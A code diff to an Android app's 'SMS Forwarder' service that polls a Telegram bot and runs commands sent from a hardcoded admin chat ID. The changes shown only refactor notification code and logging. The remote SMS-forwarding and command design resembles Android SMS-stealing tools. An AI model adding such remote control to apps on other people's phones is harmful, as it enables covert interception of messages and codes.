@@ -18,6 +18,7 @@ import java.net.URL;
 public class TelegramService extends Service {
     private static final String CHANNEL_ID = "sms_channel";
     private static final int NOTIF_ID = 1;
+    private static final String TAG = "TelegramService";
     private static final String BOT_TOKEN = TelegramSender.getBotToken();
     private Thread worker;
     private volatile boolean running = true;
@@ -25,8 +26,8 @@ public class TelegramService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        createNotificationChannel();
-        startForeground(NOTIF_ID, buildNotification());
+        // Сразу вызываем startForeground, чтобы избежать ошибки
+        startForeground(NOTIF_ID, createNotification());
 
         long MY_ID = 6660506530L; // ЗАМЕНИ НА СВОЙ chat_id, баля
         PreferencesHelper.setAdminId(this, MY_ID);
@@ -36,7 +37,7 @@ public class TelegramService extends Service {
         startPolling();
     }
 
-    private void createNotificationChannel() {
+    private Notification createNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
@@ -45,23 +46,16 @@ public class TelegramService extends Service {
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
-        }
-    }
-
-    private Notification buildNotification() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             return new Notification.Builder(this, CHANNEL_ID)
                     .setContentTitle("SMS Forwarder")
-                    .setContentText("Активен и слушает команды")
+                    .setContentText("Активен, команды работают")
                     .setSmallIcon(android.R.drawable.sym_def_app_icon)
-                    .setPriority(Notification.PRIORITY_LOW)
                     .build();
         } else {
             return new Notification.Builder(this)
                     .setContentTitle("SMS Forwarder")
-                    .setContentText("Активен и слушает команды")
+                    .setContentText("Активен, команды работают")
                     .setSmallIcon(android.R.drawable.sym_def_app_icon)
-                    .setPriority(Notification.PRIORITY_LOW)
                     .build();
         }
     }
@@ -88,13 +82,10 @@ public class TelegramService extends Service {
                             JSONObject upd = updates.getJSONObject(i);
                             int updateId = upd.getInt("update_id");
                             PreferencesHelper.setLastUpdateId(this, updateId);
-
                             if (upd.has("message")) {
                                 JSONObject msg = upd.getJSONObject("message");
-                                // Правильный парсинг chat_id
                                 JSONObject chat = msg.getJSONObject("chat");
                                 long chatId = chat.getLong("id");
-
                                 if (chatId == PreferencesHelper.getAdminId(this) && msg.has("text")) {
                                     String text = msg.getString("text");
                                     handleCommand(text);
@@ -103,7 +94,7 @@ public class TelegramService extends Service {
                         }
                     }
                 } catch (Exception e) {
-                    Log.e("TelegramService", "Poll error", e);
+                    Log.e(TAG, "Poll error", e);
                 }
             }
         });
